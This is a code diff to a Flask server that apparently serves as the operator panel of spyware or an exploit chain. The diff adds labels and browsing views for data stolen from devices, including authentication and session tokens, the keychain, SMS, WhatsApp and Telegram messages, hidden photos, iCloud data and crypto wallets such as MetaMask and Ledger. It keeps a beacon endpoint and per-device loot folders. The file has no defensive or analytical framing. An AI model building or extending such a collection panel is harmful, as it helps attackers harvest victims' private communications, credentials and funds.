@@ -13,6 +13,37 @@ TEXT_EXT = {".txt", ".json", ".xml", ".plist", ".log", ".csv", ".md",
 IMG_EXT  = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".heic"}
 DB_EXT   = {".db", ".sqlite", ".sqlitedb"}
 
+# human-readable labels for the category folders the chain produces
+CATEGORY_LABELS = {
+    "tokens":          "Authentication Tokens",
+    "keychain":        "Keychain Database",
+    "messages":        "Messages (SMS + iMessage)",
+    "whatsapp":        "WhatsApp Messages",
+    "telegram":        "Telegram Messages",
+    "files":           "Forensic Files",
+    "photos":          "Photos",
+    "hidden-photos":   "Hidden Photos",
+    "screenshots":     "Screenshots",
+    "sessions":        "App Session Tokens",
+    "wallets":         "Crypto Wallet Data",
+    "wallet-coinbase": "Coinbase Wallet",
+    "wallet-binance":  "Binance Wallet",
+    "wallet-metamask": "MetaMask",
+    "wallet-ledger":   "Ledger Live",
+    "wallet-trezor":   "Trezor Suite",
+    "wallet-exodus":   "Exodus Wallet",
+    "icloud-drive":    "iCloud Drive",
+    "icloud-app":      "iCloud App Data",
+    "icloud-apple":    "iCloud Apple Data",
+    "icloud-other":    "iCloud Other",
+    "system":          "System Data",
+    "test":            "Test Uploads",
+    "check":           "Status Checks",
+}
+
+def label_for(cat: str) -> str:
+    return CATEGORY_LABELS.get(cat, cat.replace("_", " ").replace("-", " ").title())
+
 def safe_join(base: Path, *parts) -> Path:
     p = base.joinpath(*parts).resolve()
     if not str(p).startswith(str(base.resolve())):
@@ -65,58 +96,29 @@ def beacon():
     print(f"[beacon] {d}")
     return jsonify({"ok": True})
 
-# ---------- dashboard ----------
+# ---------- panel helpers ----------
 
-@app.route("/panel")
-def panel():
-    devices = []
-    if STORE.exists():
-        for d in sorted(STORE.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
-            if not d.is_dir():
-                continue
-            files = 0
-            bytes_ = 0
-            cats = {}
-            for cat in d.iterdir():
-                if not cat.is_dir():
-                    continue
-                n = 0
-                b = 0
-                for f in cat.iterdir():
-                    if f.name.endswith(".meta"):
-                        continue
-                    n += 1
-                    b += f.stat().st_size
-                cats[cat.name] = {"files": n, "bytes": b}
-                files += n
-                bytes_ += b
-            devices.append({
-                "id": d.name,
-                "mtime": int(d.stat().st_mtime),
-                "files": files,
-                "bytes": bytes_,
-                "cats": cats,
-            })
-    return render_template("panel.html", devices=devices)
-
-@app.route("/panel/device/<device_id>")
-def device(device_id):
+def gather_device(device_id: str):
     d = safe_join(STORE, device_id)
-    if not d.exists():
-        abort(404)
+    if not d.exists() or not d.is_dir():
+        return None
     cats = []
+    total_files = 0
+    total_bytes = 0
     for cat in sorted(d.iterdir(), key=lambda p: p.name):
         if not cat.is_dir():
             continue
         entries = []
+        cat_files = 0
+        cat_bytes = 0
         for f in sorted(cat.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
             if f.name.endswith(".meta"):
                 continue
             meta = {}
-            meta_path = cat / (f.name + ".meta")
-            if meta_path.exists():
+            mp = cat / (f.name + ".meta")
+            if mp.exists():
                 try:
-                    meta = json.loads(meta_path.read_text())
+                    meta = json.loads(mp.read_text())
                 except Exception:
                     pass
             entries.append({
@@ -127,9 +129,76 @@ def device(device_id):
                 "description": meta.get("description", ""),
                 "is_db": f.suffix.lower() in DB_EXT,
                 "is_img": f.suffix.lower() in IMG_EXT,
+                "is_text": f.suffix.lower() in TEXT_EXT,
             })
-        cats.append({"name": cat.name, "entries": entries})
-    return render_template("device.html", device_id=device_id, cats=cats)
+            cat_files += 1
+            cat_bytes += f.stat().st_size
+        total_files += cat_files
+        total_bytes += cat_bytes
+        cats.append({
+            "name": cat.name,
+            "label": label_for(cat.name),
+            "files": cat_files,
+            "bytes": cat_bytes,
+            "entries": entries,
+        })
+    return {
+        "id": device_id,
+        "mtime": int(d.stat().st_mtime),
+        "files": total_files,
+        "bytes": total_bytes,
+        "cats": cats,
+    }
+
+# ---------- panel routes ----------
+
+@app.route("/panel")
+def panel():
+    devices = []
+    if STORE.exists():
+        for d in sorted(STORE.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
+            if not d.is_dir():
+                continue
+            info = gather_device(d.name)
+            if info:
+                devices.append(info)
+    return render_template("panel.html", devices=devices)
+
+@app.route("/panel/device/<device_id>")
+def device_view(device_id):
+    info = gather_device(device_id)
+    if not info:
+        abort(404)
+    return render_template("device.html", d=info)
+
+@app.route("/panel/category/<device_id>/<category>")
+def category_view(device_id, category):
+    d = safe_join(STORE, device_id, category)
+    if not d.exists() or not d.is_dir():
+        abort(404)
+    entries = []
+    for f in sorted(d.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
+        if f.name.endswith(".meta"):
+            continue
+        meta = {}
+        mp = d / (f.name + ".meta")
+        if mp.exists():
+            try:
+                meta = json.loads(mp.read_text())
+            except Exception:
+                pass
+        entries.append({
+            "name": f.name,
+            "bytes": f.stat().st_size,
+            "mtime": int(f.stat().st_mtime),
+            "orig_path": meta.get("path", ""),
+            "description": meta.get("description", ""),
+            "is_db": f.suffix.lower() in DB_EXT,
+            "is_img": f.suffix.lower() in IMG_EXT,
+        })
+    return render_template("category.html",
+                           device_id=device_id, category=category,
+                           label=label_for(category), entries=entries)
 
 @app.route("/panel/file/<device_id>/<category>/<name>")
 def file_view(device_id, category, name):
@@ -200,4 +269,4 @@ def file_raw(device_id, category, name):
     return send_from_directory(f.parent, f.name, as_attachment=True)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=7860, threaded=True)
+    app.run(host="0.0.0.0", port=8080, threaded=True)
